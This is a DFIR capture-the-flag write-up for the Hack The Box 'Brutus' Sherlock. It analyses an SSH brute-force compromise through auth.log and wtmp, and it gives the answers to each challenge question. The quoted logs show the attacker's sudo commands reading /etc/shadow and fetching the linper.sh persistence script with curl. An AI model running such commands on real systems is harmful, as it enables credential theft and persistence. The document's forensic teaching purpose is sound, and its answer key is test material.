# Brutus Writeup

> Category : DFIR

> In this Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.

## Solution

```shell
wget -O brutus "https://labs.hackthebox.com/api/v4/challenges/631/cdn/redirect?auth_user_id=3179731&expires=1788553396&signature=e81bd01e48009543c7ad5231376d7738cc75c8fb08ee8c2d5258763ecf4bb43e"
```

```shell
7z x brutus
hacktheblue
```

> 1. Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?

```shell
grep sshd auth.log
```

From our result we see there are numerous attempts from a single IP address `65.2.161.68` indicating a brute force attack. Take particular note of the timestamps, all falling within seconds.

> Answer: 65.2.161.68

> 2. The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?

```shell
grep sshd auth.log | grep "Accepted password"
```

```text
Mar  6 06:19:54 ip-172-31-35-28 sshd[1465]: Accepted password for root from 203.101.190.9 port 42825 ssh2
Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2
```

Here we found `65.2.161.68` first login is to the `root` account. So this must be the user.

> Answer: root

> 3. Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.

```shell
python utmp.py wtmp -o wtmp.csv 
```

```shell
grep 65.2.161.68 wtmp.csv | grep root
```

```text
"USER"  "2549"  "pts/1" "ts/1"  "root"  "65.2.161.68"   "0"     "0"     "0"     "2024/03/06 06:32:45"   "387923"        "65.2.161.68"
```

> Answer: 2024-03-06 06:32:45

> 4. SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?

```shell
grep "systemd-logind" auth.log
```

```text
Mar  6 06:19:54 ip-172-31-35-28 systemd-logind[411]: New session 6 of user root.
Mar  6 06:31:40 ip-172-31-35-28 systemd-logind[411]: New session 34 of user root.
Mar  6 06:31:40 ip-172-31-35-28 systemd-logind[411]: Session 34 logged out. Waiting for processes to exit.
Mar  6 06:31:40 ip-172-31-35-28 systemd-logind[411]: Removed session 34.
Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Session 37 logged out. Waiting for processes to exit.
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Removed session 37.
Mar  6 06:37:34 ip-172-31-35-28 systemd-logind[411]: New session 49 of user cyberjunkie.
```

We can see that there is two new sessions for user root `34 & 37`, but we need when the attacker logged in manually. So it's the second session `37`.

> Answer: 37

> 5. The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?

```shell
grep "useradd" auth.log
```

```text
Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1
```

> Answer: cyberjunkie

> 6. What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?

Searching in MITRE ATT&CK for persistence sub-techniques.

> Answer: T1136.001

> 7. What time did the attacker's first SSH session end according to auth.log?

In question 4 we found out the session ID was 37. We are able to confirm in the auth.log that that the session 37 closed at 06:37:24.

> Answer: 2024-03-06 06:37:24

> 8. The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?

```shell
grep "COMMAND=" auth.log
```

```text
Mar  6 06:37:57 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

That's it `COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`.

> Answer: /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh

